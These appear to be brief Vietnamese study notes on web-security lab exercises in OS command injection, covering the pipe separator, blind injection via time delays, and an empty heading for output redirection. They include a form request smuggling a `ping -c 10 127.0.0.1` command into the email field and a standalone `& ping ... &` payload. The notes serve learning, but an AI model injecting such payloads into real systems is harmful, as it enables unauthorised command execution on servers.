## 1. LAB ##

# 1. Lab: OS command injection, simple case

Kí tự `|` tạo thêm một command mới

<img width="665" height="247" alt="image" src="https://github.com/user-attachments/assets/49695701-779b-426a-a14b-9fc47a2aca18" />

# 2. Lab: Blind OS command injection with time delays

`csrf=N8ZyLPvJF0YfREOnbZBsTAYdaHbC4S18&name=aaa&email=test%40gmail.com||ping+-c+10+127.0.0.1|| &subject=%C3%A2&message=qqq`

# 3. Lab: Blind OS command injection with output redirection




## 2. NOTE ##

(https://www.gnu.org/software/bash/manual/html_node/Lists.html)
<img width="626" height="115" alt="image" src="https://github.com/user-attachments/assets/e9e16710-acf0-4b1c-bd08-993b34ec7493" />

Để thực hiện blind OS command injection bằng time delay, ta có thể sử dụng cách ping 10 gói tin đến local host (127.0.0.1). Do ping trên Linux mặc định gửi khoảng 1 gói mỗi giây, nên toàn bộ lệnh mất xấp xỉ 9–10 giây. 

`& ping -c 10 127.0.0.1 &`


